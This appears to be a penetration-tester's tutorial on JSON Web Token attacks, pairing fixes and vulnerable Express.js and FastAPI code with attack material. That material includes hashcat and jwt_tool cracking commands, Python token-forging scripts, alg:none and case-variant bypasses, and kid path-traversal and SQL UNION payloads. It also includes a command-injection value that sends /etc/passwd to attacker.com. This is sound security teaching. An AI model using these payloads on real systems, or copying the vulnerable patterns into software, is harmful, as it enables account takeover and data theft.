---
title: "Advanced JWT Attacks: A Penetration Tester's Complete Guide to Exploiting JSON Web Tokens"
meta_description: "Deep-dive into advanced JWT exploitation techniques including algorithm confusion, kid injection, JWK header attacks, claim manipulation, and token replay. Includes real payloads, Burp Suite workflows, jwt_tool examples, and vulnerable/fixed code in Express.js and FastAPI."
slug: "advanced-jwt-attacks-penetration-testers-guide"
keywords:
  - JWT attacks
  - algorithm confusion attack
  - alg none bypass
  - JWT cracking hashcat
  - kid parameter injection
  - JWK header injection
  - JWT token replay
  - JWT role escalation
  - Burp Suite JWT Editor
  - jwt_tool
  - Express.js JWT vulnerability
  - FastAPI JWT security
  - JSON Web Token penetration testing
  - JWT bug bounty
  - JWT signature bypass
---

# Advanced JWT Attacks: A Penetration Tester's Complete Guide to Exploiting JSON Web Tokens

## Introduction

JSON Web Tokens have become the de facto standard for stateless authentication in modern APIs. Their adoption is widespread -- nearly every SPA-plus-API architecture, every microservice mesh, and every OAuth 2.0 implementation relies on JWTs to carry identity claims between parties. This ubiquity makes them one of the most valuable attack surfaces in web application security.

The problem is not the JWT specification itself. RFC 7519 is sound when implemented correctly. The problem is that the specification is flexible enough to permit dozens of implementation mistakes, and libraries across every language ecosystem have shipped with defaults that silently enable critical vulnerabilities. A single misconfiguration in JWT handling can escalate an unauthenticated attacker to full administrative access in one HTTP request.

This article is not an introduction to JWTs. You already know the three-part structure (header.payload.signature), you know Base64URL encoding, and you know the difference between symmetric (HMAC) and asymmetric (RSA/ECDSA) signing. What follows is a systematic walkthrough of every major JWT attack class, with real payloads, real vulnerable code, real testing workflows, and real fixes. We will cover weak secret cracking, algorithm confusion, the `alg: none` bypass, missing verification, token replay, clock skew abuse, claim manipulation, JWK header injection, `kid` parameter injection, transport considerations, and complete testing methodologies using Burp Suite and jwt_tool.

Every vulnerability discussed here has been observed in production applications. Several have appeared in critical bug bounty reports worth five-figure payouts.

---

## 1. Weak Secrets and Dictionary Attacks

### The Vulnerability

When an application uses HMAC-based signing (HS256, HS384, HS512), the security of every token depends entirely on the strength of the shared secret. If that secret is guessable, every token ever issued by the application can be forged.

This is not a theoretical concern. A study of public GitHub repositories found thousands of applications using secrets like `secret`, `password`, `your-256-bit-secret` (the default from jwt.io), and `changeme`. Even applications that use longer secrets often derive them from predictable patterns: the application name, the environment name, or a combination of both.

### Cracking Workflow with hashcat

Extract the token and save it to a file:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjk5MDAwMDAwfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk" > token.txt
```

Run hashcat in JWT mode (mode 16500):

```bash
# Dictionary attack
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack for mutations
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force short secrets (1-8 chars)
hashcat -m 16500 token.txt -a 3 ?a?a?a?a?a?a?a?a --increment
```

John the Ripper alternative:

```bash
john token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

### Cracking with jwt_tool

```bash
# Built-in dictionary attack
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Output on success:
# [+] SECRET FOUND: supersecretkey
```

### Real-World Impact

Once the secret is recovered, forging arbitrary tokens is trivial:

```javascript
const jwt = require('jsonwebtoken');

const forgedToken = jwt.sign(
  { user_id: 1, role: 'admin', email: 'admin@target.com' },
  'supersecretkey', // cracked secret
  { algorithm: 'HS256', expiresIn: '24h' }
);

console.log(forgedToken);
```

### Vulnerable Express.js Code

```javascript
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

// VULNERABLE: Weak, hardcoded secret
const SECRET = 'secret123';

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // ... authentication logic ...
  const token = jwt.sign(
    { user_id: user.id, role: user.role },
    SECRET,
    { algorithm: 'HS256', expiresIn: '1h' }
  );
  res.json({ token });
});

app.get('/admin', (req, res) => {
  try {
    const decoded = jwt.verify(req.headers.authorization.split(' ')[1], SECRET);
    if (decoded.role === 'admin') {
      res.json({ data: 'sensitive admin data' });
    } else {
      res.status(403).json({ error: 'Forbidden' });
    }
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

### Fixed Code

```javascript
const crypto = require('crypto');

// FIXED: Generate a cryptographically strong random secret
// Store in environment variable, never in source code
const SECRET = process.env.JWT_SECRET;

// On application setup, generate with:
// node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

if (!SECRET || SECRET.length < 64) {
  console.error('JWT_SECRET must be at least 64 characters');
  process.exit(1);
}
```

---

## 2. Algorithm Confusion: RS256 to HS256 Downgrade

### The Vulnerability

This is one of the most elegant JWT attacks. It exploits a fundamental design tension in the JWT specification: the same `verify()` function handles both symmetric (HMAC) and asymmetric (RSA/ECDSA) algorithms, and the algorithm to use is specified in the token header -- which is attacker-controlled.

Here is the attack flow:

1. The server uses RS256 (RSA). It signs tokens with a private key and verifies them with the public key.
2. The attacker obtains the server's public key (often exposed at `/.well-known/jwks.json`, `/api/keys`, or in TLS certificates).
3. The attacker changes the token header from `RS256` to `HS256`.
4. The attacker signs the modified token using the public key as the HMAC secret.
5. The server's `verify()` function reads the `alg` header, sees `HS256`, and uses the configured "key" (the public key) as an HMAC secret to verify the signature.
6. The signature matches. The forged token is accepted.

### Why It Works

In vulnerable implementations, the verification code looks like this:

```javascript
// VULNERABLE: Algorithm is read from the token header
jwt.verify(token, publicKey); // No algorithm restriction
```

When the library sees `alg: HS256`, it treats `publicKey` as an HMAC secret. Since the attacker also used that same public key to create the HMAC signature, verification succeeds.

### Exploitation with jwt_tool

```bash
# Obtain the public key
curl -s https://target.com/.well-known/jwks.json | python3 -c "
import json, sys, base64
jwks = json.load(sys.stdin)
# Extract and convert the RSA public key
print(json.dumps(jwks, indent=2))
"

# Convert JWK to PEM if needed
python3 jwt_tool.py <token> -V -jw jwks.json

# Execute the algorithm confusion attack
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

### Manual Exploitation

```python
import hmac
import hashlib
import base64
import json

# Read the server's public key (PEM format, including headers)
with open('public_key.pem', 'rb') as f:
    public_key_bytes = f.read()

# Craft malicious header and payload
header = base64url_encode(json.dumps({
    "alg": "HS256",
    "typ": "JWT"
}).encode())

payload = base64url_encode(json.dumps({
    "user_id": 1,
    "role": "admin",
    "iat": 1699000000,
    "exp": 1999000000
}).encode())

# Sign with the public key as HMAC secret
signing_input = f"{header}.{payload}".encode()
signature = base64url_encode(
    hmac.new(public_key_bytes, signing_input, hashlib.sha256).digest()
)

forged_token = f"{header}.{payload}.{signature}"
```

### Vulnerable Express.js Code

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

const PUBLIC_KEY = fs.readFileSync('./public.pem');

app.get('/protected', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    // VULNERABLE: No algorithm restriction
    const decoded = jwt.verify(token, PUBLIC_KEY);
    res.json({ user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Unauthorized' });
  }
});
```

### Fixed Code

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

const PUBLIC_KEY = fs.readFileSync('./public.pem');

app.get('/protected', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    // FIXED: Explicitly specify allowed algorithms
    const decoded = jwt.verify(token, PUBLIC_KEY, {
      algorithms: ['RS256'] // ONLY allow RS256
    });
    res.json({ user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Unauthorized' });
  }
});
```

### FastAPI Vulnerable Code

```python
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt

app = FastAPI()
security = HTTPBearer()

PUBLIC_KEY = open("public.pem").read()

# VULNERABLE: No algorithm restriction
def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, PUBLIC_KEY)
        return payload
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

### FastAPI Fixed Code

```python
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt

app = FastAPI()
security = HTTPBearer()

PUBLIC_KEY = open("public.pem").read()

# FIXED: Explicitly restrict algorithms
def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(
            credentials.credentials,
            PUBLIC_KEY,
            algorithms=["RS256"]  # ONLY allow RS256
        )
        return payload
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

---

## 3. The `alg: none` Bypass

### The Vulnerability

The JWT specification defines `"alg": "none"` as a valid algorithm, intended for cases where the token integrity is guaranteed by other means (such as TLS). In practice, many JWT libraries accepted `alg: none` tokens and skipped signature verification entirely. This means an attacker can craft any token with any claims, set the algorithm to `none`, remove the signature, and the server accepts it.

### Exploitation

The forged token structure:

```
base64url({"alg":"none","typ":"JWT"}).base64url({"user_id":1,"role":"admin"}).
```

Note the trailing dot -- the signature section is empty.

```bash
# Using jwt_tool
python3 jwt_tool.py <token> -X a

# Manual construction
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

echo -n '{"user_id":1,"role":"admin","iat":1699000000,"exp":1999000000}' | base64 -w 0 | tr '+/' '-_' | tr -d '='
# eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTkwMDAwMDAsImV4cCI6MTk5OTAwMDAwMH0

# Combine with empty signature
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTkwMDAwMDAsImV4cCI6MTk5OTAwMDAwMH0.
```

### Bypass Variations

Some libraries implemented naive fixes that can be bypassed with case variations:

```json
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "none "}
{"alg": "none\x00"}
```

### HTTP Request Example

```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.
Content-Type: application/json
```

### Vulnerable Code and Fix

```javascript
// VULNERABLE: Library version that accepts alg:none
const decoded = jwt.verify(token, secret);

// FIXED: Explicit algorithm whitelist rejects "none"
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'] // "none" is not in the list
});
```

Modern versions of `jsonwebtoken` (Node.js), `PyJWT`, and `java-jwt` reject `alg: none` by default. However, older versions and less common libraries may still be vulnerable. Always pin your allowed algorithms regardless.

---

## 4. Missing Signature Verification

### The Vulnerability

This is distinct from `alg: none`. In this scenario, the application parses the JWT payload (the middle Base64URL section) but never calls the verification function at all. The developer uses `jwt.decode()` instead of `jwt.verify()`, or manually Base64-decodes the payload.

### Vulnerable Patterns

```javascript
// VULNERABLE: decode() does NOT verify the signature
const payload = jwt.decode(token);
if (payload.role === 'admin') {
  // grant access
}

// VULNERABLE: Manual Base64 decode, no verification
const parts = token.split('.');
const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
```

```python
# VULNERABLE: decode without verification
import jwt
payload = jwt.decode(token, options={"verify_signature": False})

# VULNERABLE: manual decode
import base64, json
payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
```

### Exploitation

An attacker simply modifies the payload, re-encodes it in Base64URL, and sends it. The signature can be anything -- it is never checked.

```bash
# Decode the original payload
echo 'eyJ1c2VyX2lkIjoxMDIsInJvbGUiOiJ1c2VyIn0' | base64 -d
# {"user_id":102,"role":"user"}

# Modify and re-encode
echo -n '{"user_id":1,"role":"admin"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='

# Replace the payload section in the original token, keep the original signature
```

### Detection During Testing

A quick test: take a valid token, flip one bit in the signature, and send it. If the server still accepts it, signature verification is missing.

```bash
# Take valid token, corrupt the last character of the signature
ORIGINAL="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMDJ9.abc123signature"
CORRUPTED="${ORIGINAL%?}X"

curl -H "Authorization: Bearer $CORRUPTED" https://target.com/api/profile
# If this returns 200, signature verification is broken
```

---

## 5. Token Reuse After Logout (Token Replay)

### The Vulnerability

JWTs are stateless by design. When a user logs out, the client-side token is discarded, but the server has no built-in mechanism to invalidate it. If an attacker captures a token before logout (via XSS, network sniffing, log files, or browser history), that token remains valid until its `exp` claim expires.

This is a fundamental architectural issue with stateless JWTs. The token is self-contained, and the server does not maintain a session store to check against.

### Attack Scenario

1. User authenticates, receives JWT with 24-hour expiry.
2. User logs out at hour 2.
3. Attacker who captured the token at hour 1 (from access logs, shared computer, XSS payload exfiltration) uses it at hour 10.
4. Server validates the token: signature is correct, `exp` is in the future, all claims are valid.
5. Attacker has full access to the user's account.

### Testing for Token Replay

```bash
# Step 1: Authenticate and capture token
TOKEN=$(curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"TestPass123!"}' \
  | jq -r '.token')

# Step 2: Verify token works
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/profile
# Should return 200 with user data

# Step 3: Logout
curl -s -X POST https://target.com/api/logout \
  -H "Authorization: Bearer $TOKEN"

# Step 4: Replay the same token
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/profile
# VULNERABLE if this still returns 200
```

### Prevention: Token Blocklist with Redis

```javascript
const redis = require('redis');
const client = redis.createClient();

// On logout: add token to blocklist
app.post('/logout', authenticateToken, async (req, res) => {
  const token = req.headers.authorization.split(' ')[1];
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);

  if (ttl > 0) {
    // Store in Redis with TTL matching token expiry
    await client.setEx(`blocklist:${token}`, ttl, 'revoked');
  }

  res.json({ message: 'Logged out' });
});

// On every request: check blocklist
async function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  // Check blocklist BEFORE verification
  const blocked = await client.get(`blocklist:${token}`);
  if (blocked) return res.status(401).json({ error: 'Token revoked' });

  try {
    const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

### Alternative: Short-Lived Tokens with Refresh Rotation

```javascript
// Access tokens: 15 minutes
const accessToken = jwt.sign(payload, SECRET, {
  algorithm: 'HS256',
  expiresIn: '15m'
});

// Refresh tokens: 7 days, stored in DB, single-use
const refreshToken = crypto.randomBytes(64).toString('hex');
await db.refreshTokens.create({
  token: hashToken(refreshToken),
  userId: user.id,
  expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  used: false
});

// On refresh: invalidate old token, issue new pair
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  const hashed = hashToken(refreshToken);

  const stored = await db.refreshTokens.findOne({ token: hashed, used: false });
  if (!stored || stored.expiresAt < new Date()) {
    // If token was already used, potential theft -- revoke all user tokens
    if (stored?.used) {
      await db.refreshTokens.deleteMany({ userId: stored.userId });
    }
    return res.status(401).json({ error: 'Invalid refresh token' });
  }

  // Mark as used (single-use rotation)
  await db.refreshTokens.updateOne({ _id: stored._id }, { $set: { used: true } });

  // Issue new pair
  const newAccessToken = jwt.sign({ user_id: stored.userId }, SECRET, {
    algorithm: 'HS256', expiresIn: '15m'
  });
  const newRefreshToken = crypto.randomBytes(64).toString('hex');
  await db.refreshTokens.create({
    token: hashToken(newRefreshToken),
    userId: stored.userId,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    used: false
  });

  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});
```

---

## 6. Expired Token Bypass (Clock Skew Abuse)

### The Vulnerability

JWT libraries typically include a small clock skew tolerance (often 0-60 seconds) to account for time differences between servers. Some applications configure excessively large tolerances, or their servers have misconfigured NTP causing significant clock drift.

### Exploitation Vectors

**Exploiting large clockTolerance:**

```javascript
// VULNERABLE: 5-minute tolerance
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  clockTolerance: 300 // 300 seconds = 5 minutes
});
```

An attacker with a token that expired 4 minutes ago can still use it.

**Exploiting server clock drift:**

```bash
# Check server time vs actual time
curl -I https://target.com 2>/dev/null | grep -i date
# Date: Thu, 15 Feb 2024 12:00:00 GMT

# Compare with actual UTC
date -u
# If server is behind by significant margin, expired tokens are still valid
```

**Forging tokens with far-future expiry:**

If you can forge tokens (via any other vulnerability), set `exp` to a far-future timestamp:

```json
{
  "user_id": 1,
  "role": "admin",
  "iat": 1699000000,
  "exp": 2147483647
}
```

### Testing with jwt_tool

```bash
# Tamper with expiry claim
python3 jwt_tool.py <token> -T -p exp -v 2147483647

# Test if expired tokens are accepted
python3 jwt_tool.py <expired_token> -M at
```

### Fixed Code

```javascript
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  clockTolerance: 30, // Maximum 30 seconds, no more
  maxAge: '1h'        // Reject tokens older than 1 hour regardless of exp
});
```

---

## 7. Role Escalation Through JWT Claim Manipulation

### The Vulnerability

When authorization decisions are based solely on JWT claims without server-side verification, an attacker who can forge or modify tokens can escalate privileges by changing claim values.

### Attack Scenarios

**Scenario 1: Direct role claim modification**

Original token payload:
```json
{
  "user_id": 102,
  "role": "user",
  "permissions": ["read"],
  "iat": 1699000000,
  "exp": 1699086400
}
```

Forged payload (after cracking the secret or exploiting another vuln):
```json
{
  "user_id": 102,
  "role": "admin",
  "permissions": ["read", "write", "delete", "admin"],
  "iat": 1699000000,
  "exp": 1699086400
}
```

**Scenario 2: Tenant/organization escalation in multi-tenant apps**

```json
{
  "user_id": 102,
  "org_id": "org_attacker",
  "role": "member"
}
```

Modified to:
```json
{
  "user_id": 102,
  "org_id": "org_victim",
  "role": "owner"
}
```

**Scenario 3: User ID manipulation**

Even without changing roles, changing `user_id` from `102` to `1` often grants access to the first registered account, which is typically an administrator.

### HTTP Request

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6WyJyZWFkIiwid3JpdGUiLCJkZWxldGUiLCJhZG1pbiJdfQ.forged_signature_here
```

### Prevention

```javascript
// WRONG: Trust JWT claims for authorization
app.get('/admin', (req, res) => {
  if (req.user.role === 'admin') { // role from JWT
    return res.json(getAdminData());
  }
  res.status(403).json({ error: 'Forbidden' });
});

// CORRECT: Verify role from the database on sensitive operations
app.get('/admin', async (req, res) => {
  // req.user.user_id comes from verified JWT
  const user = await db.users.findByPk(req.user.user_id);
  if (!user || user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  res.json(getAdminData());
});
```

---

## 8. JWK Header Injection

### The Vulnerability

The JWT specification allows embedding the signing key directly in the token header via the `jwk` (JSON Web Key) parameter. If the server trusts the key provided in the token header to verify that same token, an attacker can sign tokens with their own key and embed the corresponding public key in the header.

### Attack Flow

1. Attacker generates a new RSA key pair.
2. Attacker crafts a JWT with elevated privileges.
3. Attacker signs the token with their private key.
4. Attacker embeds their public key in the `jwk` header parameter.
5. Server extracts the public key from the `jwk` header.
6. Server uses that attacker-supplied key to verify the signature.
7. Signature is valid (because the attacker signed with the matching private key).
8. Server accepts the forged token.

### Exploitation

```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import jwt
import json

# Generate attacker's RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Extract public key components for JWK
public_numbers = public_key.public_numbers()
n = public_numbers.n
e = public_numbers.e

import base64

def int_to_base64url(value):
    value_bytes = value.to_bytes((value.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(value_bytes).rstrip(b'=').decode()

# Craft the JWK
jwk = {
    "kty": "RSA",
    "n": int_to_base64url(n),
    "e": int_to_base64url(e),
    "use": "sig",
    "alg": "RS256"
}

# Build malicious header
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": jwk  # Embedding attacker's public key
}

payload = {
    "user_id": 1,
    "role": "admin",
    "iat": 1699000000,
    "exp": 1999000000
}

# Sign with attacker's private key
forged_token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={"jwk": jwk}
)

print(forged_token)
```

### jwt_tool Exploitation

```bash
python3 jwt_tool.py <token> -X i
# This embeds a new JWK in the header and signs with the corresponding private key
```

### Prevention

Never extract signing keys from the token itself. Always use a fixed, pre-configured key or fetch from a trusted JWKS endpoint with caching and key ID validation:

```javascript
const jwksRsa = require('jwks-rsa');
const { expressjwt: jwtMiddleware } = require('express-jwt');

app.use(jwtMiddleware({
  secret: jwksRsa.expressJwtSecret({
    cache: true,
    rateLimit: true,
    jwksRequestsPerMinute: 5,
    jwksUri: 'https://auth.yourapp.com/.well-known/jwks.json'
  }),
  algorithms: ['RS256'],
  // CRITICAL: Do not trust jwk/jku headers from the token
}));
```

---

## 9. `kid` Parameter Injection

### The Vulnerability

The `kid` (Key ID) header parameter tells the server which key to use for verification. If the server uses this value in a file path lookup, database query, or any other operation without sanitization, it becomes an injection vector.

### Path Traversal via `kid`

If the server reads key files based on `kid`:

```javascript
// VULNERABLE: kid used directly in file path
const keyPath = path.join('/app/keys/', header.kid);
const key = fs.readFileSync(keyPath);
const decoded = jwt.verify(token, key, { algorithms: ['HS256'] });
```

Attack: Set `kid` to traverse to a known file and use its contents as the HMAC secret:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../dev/null"
}
```

`/dev/null` reads as an empty string. Sign the token with an empty string as the secret:

```bash
python3 jwt_tool.py <token> -X k -pk /dev/null
```

Other traversal targets:

```json
{"kid": "../../../etc/hostname"}
{"kid": "../../../proc/sys/kernel/hostname"}
{"kid": "../../public/css/style.css"}
```

The attacker reads the target file's content (if accessible through other means) and uses it as the HMAC secret.

### SQL Injection via `kid`

If `kid` is used in a database query:

```javascript
// VULNERABLE: kid in raw SQL
const query = `SELECT key_value FROM signing_keys WHERE key_id = '${header.kid}'`;
const result = await db.query(query);
const key = result.rows[0].key_value;
```

Injection payload:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'attacker-controlled-secret' -- "
}
```

The query becomes:
```sql
SELECT key_value FROM signing_keys WHERE key_id = '' UNION SELECT 'attacker-controlled-secret' --'
```

The server now uses `attacker-controlled-secret` as the HMAC key. The attacker signs the token with that same string.

### Command Injection via `kid`

In rare cases where `kid` is passed to a shell command:

```json
{
  "kid": "key1; curl https://attacker.com/exfil?data=$(cat /etc/passwd)"
}
```

### jwt_tool Testing

```bash
# Path traversal
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# SQL injection
python3 jwt_tool.py <token> -I -hc kid -hv "' UNION SELECT 'secret123' --" -S hs256 -p "secret123"
```

### Fixed Code

```javascript
// FIXED: Validate kid against an allowlist
const ALLOWED_KEYS = {
  'key-2024-01': process.env.JWT_KEY_2024_01,
  'key-2024-02': process.env.JWT_KEY_2024_02,
};

function getSigningKey(kid) {
  const key = ALLOWED_KEYS[kid];
  if (!key) {
    throw new Error(`Unknown key ID: ${kid}`);
  }
  return key;
}

app.get('/protected', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const unverifiedHeader = jwt.decode(token, { complete: true })?.header;

  try {
    const key = getSigningKey(unverifiedHeader?.kid);
    const decoded = jwt.verify(token, key, { algorithms: ['HS256'] });
    res.json({ user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Unauthorized' });
  }
});
```

---

## 10. JWT Transport: Cookies vs. Headers vs. Query Parameters

### Security Implications by Transport Method

**Authorization Header (Bearer Token)**

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

- Not automatically sent by the browser (CSRF-resistant by default).
- Stored in JavaScript-accessible memory (localStorage, sessionStorage, or in-memory variable).
- Vulnerable to XSS: any script injection can read and exfiltrate the token.
- Cannot be marked `HttpOnly`.

**HTTP-Only Secure Cookie**

```http
Set-Cookie: token=eyJhbGciOiJIUzI1NiJ9...; HttpOnly; Secure; SameSite=Strict; Path=/api
```

- Not accessible to JavaScript (`HttpOnly`).
- Automatically sent on every request (CSRF risk -- must use `SameSite` and/or CSRF tokens).
- `Secure` flag ensures transmission only over HTTPS.
- `SameSite=Strict` prevents cross-origin request attachment.

**Query Parameters**

```http
GET /api/data?token=eyJhbGciOiJIUzI1NiJ9... HTTP/1.1
```

- Logged in server access logs, proxy logs, browser history, Referer headers.
- Visible in URL bars and shared links.
- Never use this method. It is a critical vulnerability.

### Recommendation

Use `HttpOnly; Secure; SameSite=Strict` cookies for browser-facing applications. Use Authorization headers for service-to-service communication. Never use query parameters.

```javascript
// Setting JWT as a secure cookie in Express
app.post('/login', async (req, res) => {
  // ... authenticate user ...
  const token = jwt.sign(payload, SECRET, { algorithm: 'HS256', expiresIn: '15m' });

  res.cookie('access_token', token, {
    httpOnly: true,
    secure: true,                  // HTTPS only
    sameSite: 'strict',           // No cross-site sending
    path: '/api',                  // Only sent to /api routes
    maxAge: 15 * 60 * 1000        // 15 minutes
  });

  res.json({ message: 'Authenticated' });
});

// Reading JWT from cookie
function authenticateToken(req, res, next) {
  const token = req.cookies?.access_token;
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    req.user = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
    next();
  } catch (err) {
    res.clearCookie('access_token');
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

---

## 11. Burp Suite JWT Testing Workflow

### Setup

1. Install the **JWT Editor** extension from the BApp Store.
2. Install the **JSON Web Tokens** (InQL helper) extension.
3. Navigate to the JWT Editor tab to manage keys.

### Workflow

**Step 1: Intercept and Identify JWT Tokens**

Browse the application through Burp's proxy. JWT tokens appear in:
- `Authorization: Bearer <token>` headers
- Cookies (look for Base64URL-encoded values with two dots)
- Response bodies (login endpoints)

**Step 2: Decode and Analyze**

In the Proxy > HTTP History tab, click on a request containing a JWT. The JWT Editor tab automatically decodes and displays the header, payload, and signature.

Examine:
- What algorithm is used (`alg` field)?
- What claims are present (roles, permissions, user IDs, tenant IDs)?
- What is the token lifetime (`exp` - `iat`)?
- Is `kid`, `jku`, or `jwk` present in the header?

**Step 3: Generate Attack Keys**

In the JWT Editor Keys tab:
- Generate a new RSA key (for algorithm confusion and JWK injection attacks).
- Generate a new symmetric key (for HMAC attacks after secret cracking).

**Step 4: Attack Execution**

Right-click a request in Repeater > Extensions > JWT Editor:

- **Embedded JWK Attack**: Signs with your generated private key and embeds the public key in the `jwk` header.
- **"alg: none" Attack**: Removes the signature and sets the algorithm to `none`.
- **HMAC Key Confusion**: If you have the server's public key (PEM), add it as a symmetric key in JWT Editor Keys, then sign with it.

**Step 5: Intruder-Based Claim Fuzzing**

1. Send a JWT-bearing request to Intruder.
2. Decode the JWT payload.
3. Set payload positions on claim values (role, user_id, org_id).
4. Use a wordlist of privilege values: `admin`, `superadmin`, `root`, `owner`, `system`.
5. Run the attack and analyze response differences.

**Step 6: Scanner Integration**

Burp's active scanner (Pro) with JWT Editor installed will automatically test for:
- `alg: none` acceptance
- Algorithm confusion
- Signature verification bypass
- Known weak secrets

---

## 12. jwt_tool Complete Testing Guide

### Installation

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt
```

### Reconnaissance

```bash
# Decode and analyze a token
python3 jwt_tool.py <token>

# Verbose output with timestamps
python3 jwt_tool.py <token> -V
```

### Automated Scanning (Playbook Mode)

```bash
# Run all tests against a target URL
python3 jwt_tool.py -t https://target.com/api/profile -rh "Authorization: Bearer <token>" -M pb

# Playbook tests include:
# - alg:none variants
# - Null signature
# - Algorithm confusion (if public key provided)
# - Expired token acceptance
# - Claim injection
```

### Specific Attacks

```bash
# alg:none attack
python3 jwt_tool.py <token> -X a

# Key confusion with public key
python3 jwt_tool.py <token> -X k -pk public.pem

# JWK injection
python3 jwt_tool.py <token> -X i

# Sign with a known secret
python3 jwt_tool.py <token> -S hs256 -p "discovered_secret"

# Tamper specific claims
python3 jwt_tool.py <token> -T -pc role -pv admin
python3 jwt_tool.py <token> -T -pc user_id -pv 1

# Inject into kid header
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Fuzz claim values
python3 jwt_tool.py <token> -I -pc role -pv "FUZZ" -d roles_wordlist.txt
```

### Output to Burp

```bash
# Proxy through Burp for request analysis
python3 jwt_tool.py -t https://target.com/api/profile \
  -rh "Authorization: Bearer <token>" \
  -M pb \
  -proxy 127.0.0.1:8080
```

---

## 13. Common Developer Mistakes

1. **Using `jwt.decode()` instead of `jwt.verify()`**. Every major JWT library has both functions. `decode()` does not check the signature.

2. **Not specifying `algorithms` in verification options**. This enables algorithm confusion attacks.

3. **Hardcoding secrets in source code**. Secrets end up in Git history, Docker images, and client-side bundles.

4. **Using the same secret across environments**. Tokens from staging work in production.

5. **Storing JWTs in localStorage**. Any XSS vulnerability exfiltrates all user tokens.

6. **Setting excessively long expiration times**. 24-hour or 7-day access tokens without rotation or revocation mechanisms.

7. **Trusting JWT claims for authorization without server-side checks**. The token says "admin" so the user must be an admin.

